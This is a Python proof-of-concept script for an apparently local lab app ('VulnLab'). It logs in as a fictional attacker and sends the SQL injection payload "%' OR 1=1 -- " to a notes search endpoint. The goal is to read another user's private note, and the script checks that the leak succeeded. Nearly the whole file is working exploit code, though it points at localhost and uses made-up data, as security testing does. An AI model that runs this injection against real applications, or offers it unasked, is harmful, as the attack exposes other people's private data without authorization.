from uuid import uuid4

import requests

BASE_URL = "http://127.0.0.1:5000"
TIMEOUT = 5
PAYLOAD = "%' OR 1=1 -- "

def send(session, method, path, **kwargs):
    response = session.request(method, f"{BASE_URL}{path}", timeout=TIMEOUT, **kwargs,)
    response.raise_for_status()
    return response


def register_and_login(session, username, password):
    registration = send(session,
        "POST", "/auth/register",
        data={
            "username": username,
            "password": password,
        },
    )

    if "already registered" in registration.text:
        raise RuntimeError(f"Username collision: {username}")

    login = send(session,
        "POST", "/auth/login",
        data={
            "username": username,
            "password": password,
        },
    )

    if username not in login.text:
        raise RuntimeError(f"Login failed for {username}")


def main():
    suffix = uuid4().hex[:8]

    victim_username = f"victim_{suffix}"
    attacker_username = f"attacker_{suffix}"
    password = "local-demo-password"

    victim_title = f"Payroll Draft {suffix}"
    evidence_marker = f"FAKE-SQL-EVIDENCE-{suffix}"

    health = requests.get(
        f"{BASE_URL}/health",
        timeout=TIMEOUT,
    )
    health.raise_for_status()

    print("[+] VulnLab health check passed")

    with requests.Session() as victim:
        register_and_login(victim, victim_username,password,)

        created = send(victim,
            "POST", "/notes/create",
            data={
                "title": victim_title,
                "body": evidence_marker,
            },
        )

        if victim_title not in created.text:
            raise RuntimeError("Victim note creation failed")

    print("[+] Created fictional victim and private note")

    with requests.Session() as attacker:
        register_and_login(attacker, attacker_username, password)

        control = send(attacker,
            "GET", "/notes/search",
            params={"q": victim_title},
        )

        if evidence_marker in control.text:
            raise RuntimeError(
                "Control search unexpectedly exposed the victim note"
            )

        print("[+] Control search did not expose the victim note")

        exploit = send(attacker,
            "GET", "/notes/search",
            params={"q": PAYLOAD},
        )

        if evidence_marker not in exploit.text:
            raise RuntimeError(
                "Injection payload did not expose the evidence!"
            )

    print("[+] SQL injection confirmed")
    print(f"    Payload: {PAYLOAD}")
    print(f"    Leaked marker: {evidence_marker}")

    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except requests.RequestException as error:
        print(f"[-] HTTP request failed: {error}")
        raise SystemExit(1)
    except RuntimeError as error:
        print(f"[-] PoC failed: {error}")
        raise SystemExit(1)